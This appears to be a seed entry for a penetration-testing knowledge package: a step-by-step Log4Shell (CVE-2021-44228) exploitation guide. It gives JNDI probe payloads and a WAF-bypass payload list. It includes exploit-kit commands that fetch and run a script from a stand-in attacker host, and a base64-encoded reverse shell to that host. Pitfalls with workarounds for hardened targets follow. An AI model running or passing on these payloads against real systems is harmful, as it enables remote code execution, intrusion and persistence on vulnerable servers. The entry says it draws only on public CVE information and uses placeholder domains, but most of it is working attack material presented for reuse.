# [Seed] Log4Shell (CVE-2021-44228) JNDI Injection to Achieve RCE

## Scenario Classification
Penetration Testing / Web RCE

## Goal Overview
A Java web application uses a vulnerable version of Log4j2 (< 2.17.0). When any user-controllable field is logged, it triggers remote JNDI loading. Build an LDAP/RMI service to push a malicious class and gain code execution on the target.

## Complete Execution Chain

1. Target identification.
   - The `Server` and `X-Powered-By` HTTP headers contain Java application framework names (Tomcat/Spring/Liferay).
   - Version fingerprinting: login page, 404 page, path disclosure.
   - Vulnerability confirmation: send a probe payload through any field that gets logged (User-Agent, Referer, X-Forwarded-For, login username, search box).
2. Prepare an OOB listener.
   - DNSLog platform (dnslog.cn / interactsh / Burp Collaborator).
   - Self-hosted LDAP service (marshalsec / JNDI-Exploit-Kit).
3. Probe for the vulnerability.
   ```
   ${jndi:ldap://abc123.dnslog.cn/x}
   ```
   Insert it into fields such as User-Agent; receiving a resolution record for `abc123.dnslog.cn` on the DNSLog platform confirms it.
4. Start the exploit service (self-hosted public VPS or ngrok reverse proxy).
   ```bash
   java -jar JNDI-Exploit-Kit.jar -L 0.0.0.0:1389 -P 0.0.0.0:8888 -C 'curl http://attacker.com/sh|bash'
   ```
5. Trigger the exploit payload.
   ```
   ${jndi:ldap://attacker.com:1389/Basic/Command/base64/Y3VybCBodHRwOi8vYXR0YWNrZXIuY29tL3NofGJhc2g=}
   ```
6. Obtain a reverse shell → follow the attack-chain for subsequent privilege escalation / persistence.

## Pitfalls

| Issue | Cause | Solution | Time Spent |
|------|------|---------|------|
| Probe payload gets no DNS callback | Target is on an internal network with no internet access | Use a DNS-only OOB service such as oast.online, or test an internal DNSLog | 1h |
| DNS resolves but LDAP is unreachable | Egress policy only allows DNS | Switch to DNS exfiltration to carry data out directly without LDAP | 1.5h |
| LDAP is reachable but the target does not load the class | Higher JDK versions (8u191+/11.0.1+/...) default to `com.sun.jndi.ldap.object.trustURLCodebase=false` | Switch to a local gadget chain such as `Tomcat` / `Groovy` / `BeanFactory` (no remote class loading required) | 3h |
| Double quotes escaped / payload blocked by WAF | Various ${} nesting bypasses existing rules | Bypass with nested forms such as `${${::-j}ndi:...}` / `${${lower:j}ndi:...}` / `${env:xx:-jndi}` | 1h |
| Vulnerability triggers but no shell obtained | Commands containing special characters are mangled in Runtime.exec | Wrap with base64 encoding: `bash -c {echo,base64}|{base64,-d}|bash` | 30min |
| Spring Boot app did not reproduce | Spring uses Logback, not Log4j2 | Check the dependency tree to see whether spring-boot-starter-log4j2 was pulled in | 20min |

## Toolchain Findings

- **JNDI-Exploit-Kit** (welk1n / pimps) starts LDAP+RMI+HTTP in one command and supports local gadget bypass.
- **JNDI-Injection-Exploit** is an older version with broader gadget support but is no longer maintained.
- The **Nuclei** template `cves/2021/CVE-2021-44228.yaml` is suitable for scanning whether assets are affected.
- **interactsh-client** from ProjectDiscovery: self-hosted OOB is more private than dnslog.cn.
- **CrowdStrike CVE-2021-44228 scanner** detects JndiLookup.class at the binary level.

## Key Code/Commands

WAF bypass payload collection:

```text
${jndi:ldap://x.dnslog.cn/a}                    # basic
${${::-j}ndi:ldap://x.dnslog.cn/a}              # nested
${${lower:j}ndi:ldap://x.dnslog.cn/a}           # lower
${${upper:j}ndi:ldap://x.dnslog.cn/a}           # upper
${${env:NaN:-j}ndi:ldap://x.dnslog.cn/a}        # env fallback
${jndi:${lower:l}${lower:d}a${lower:p}://...}   # extreme character splitting
${jndi:dns://x.dnslog.cn}                       # DNS channel
${jndi:rmi://attacker.com:1099/a}               # RMI instead of LDAP
```

Start the interactsh service:

```bash
interactsh-client -v
# Output: abc123.oast.online ← use this domain to replace the dnslog in the payload
```

One-command exploitation with JNDI-Exploit-Kit:

```bash
java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar \
  -L attacker.com:1389 \
  -P attacker.com:8888 \
  -C 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx}|{base64,-d}|bash'
# Outputs several usable payloads; pick one and inject it into the target
```

## Suggestions for This Package

- Create a dedicated `pentest-tools/references/log4shell-bypass-payloads.md` to centralize 50+ bypass payloads.
- The nuclei template is already included → remind users to run `nuclei -t cves/2021/CVE-2021-44228.yaml -l targets.txt`.
- Add a standard action checklist for "after entering the internal network via Log4Shell" to attack-chain.

## Reusable Patterns/Script Snippets

**Three-stage Log4Shell detection method**:

```text
1. Batch-send ${jndi:ldap://oob/a} across multiple fields → check whether the OOB platform receives a callback
2. Callback received → start a local gadget LDAP (no remote class loading) → push the payload
3. No callback → switch to the DNS channel for out-of-band data exfiltration
```

**Key decision points**:

```text
- DNSLog receives a callback but LDAP is unreachable → higher JDK version; a local gadget is required
- Even DNS is unreachable → internal OOB / second-order reflection (first compromise a secondary system with internet egress)
- Command with special characters gets no response → base64 wrapping
```

## Evolution Actions
- [x] Routing matrix already has the "Log4j" / "JNDI injection" keywords
- [ ] Create a separate log4shell-bypass-payloads.md
- [ ] Add interactsh-client to the bootstrap manifest

## Environment Information
- Attacker machine: Kali, Java 8 (to run the LDAP service)
- OOB platform: dnslog.cn / oast.online / self-hosted interactsh
- Target: any Java web app using Log4j2 < 2.17.0

## Anonymization Requirements
This entry is seed data, written based on public CVE information, and does not involve real production targets. All domains/IPs are placeholder examples.
